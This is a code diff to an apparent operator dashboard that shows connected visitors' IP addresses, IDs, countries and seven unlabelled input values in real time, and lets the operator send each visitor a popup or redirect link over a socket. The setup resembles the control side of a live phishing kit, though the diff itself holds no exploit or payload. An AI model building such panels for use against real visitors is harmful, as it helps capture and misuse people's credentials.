@@ -7,9 +7,14 @@
     <body>
 
         <style>
-            table {
+            .table-container {
                 width: 100%;
+                overflow-x: scroll;
+            }
+            table {
+                min-width: 100%;
                 margin: 10px auto;
+                font-size: .9rem;
             }
             table, tr, td, th {
                 border: 1px solid #000;
@@ -18,26 +23,31 @@
             }
         </style>
 
-        <table id="userTable">
-            <thead>
-              <tr>
-                <th>IP Address</th>
-                <th>User ID</th>
-                <th>Input 1</th>
-                <th>Input 2</th>
-                <th>Input 3</th>
-                <th>Input 4</th>
-                <th>Input 5</th>
-                <th>Input 6</th>
-                <th>Country</th>
-                <th>Input 7</th>
-                <th>Link</th>
-                <th>Action</th>
-              </tr>
-            </thead>
-            <tbody>
-            </tbody>
-        </table>
+        <div class="table-container">
+            <table id="userTable">
+                <thead>
+                  <tr>
+                    <th>IP Address</th>
+                    <th>User ID</th>
+                    <th>Datetime</th>
+                    <th>Span</th>
+                    <th>Input 1</th>
+                    <th>Input 2</th>
+                    <th>Input 3</th>
+                    <th>Input 4</th>
+                    <th>Input 5</th>
+                    <th>Input 6</th>
+                    <th>Country</th>
+                    <th>Input 7</th>
+                    <th>Popup Link</th>
+                    <th>Main Link</th>
+                    <th>Action</th>
+                  </tr>
+                </thead>
+                <tbody>
+                </tbody>
+            </table>
+        </div>
 
 
         <script src="./jquery.js"></script>
@@ -51,6 +61,8 @@
                         <tr userId="${data.userId}">
                             <td><span>${data.ipAddress}</span> <button class="table-copy">📋</button></td>
                             <td><span>${data.userId}</span> <button class="table-copy">📋</button></td>
+                            <td><span>${data.datetime}</span> <button class="table-copy">📋</button></td>
+                            <td><span>${data.span}</span> <button class="table-copy">📋</button></td>
                             <td><span>${data.input1}</span> <button class="table-copy">📋</button></td>
                             <td><span>${data.input2}</span> <button class="table-copy">📋</button></td>
                             <td><span>${data.input3}</span> <button class="table-copy">📋</button></td>
@@ -62,6 +74,9 @@
                             <td>
                                 <span style="display: none">✅</span>
                                 <input type="text" userId="${data.userId}" class="table-input">
+                            </td>
+                            <td>
+                                <input type="text" userId="${data.userId}" class="table-main-input">
                             </td>
                             <td><button userId="${data.userId}" class="table-btn">Close Popup</button></td>
                         </tr>
@@ -78,8 +93,9 @@
                     $(this).hide()
                     $(this).parent().find('span').show()
                 })
+
                 $('table').on('click', '.table-btn', function() {
-                    socket.emit('finish', $(this).attr('userId'), $(this).attr('link'))
+                    socket.emit('finish', $(this).attr('userId'), $(this).parents('tr').find('.table-main-input').val())
                 })
 
                 socket.on('closePopup', (userId, url) => {
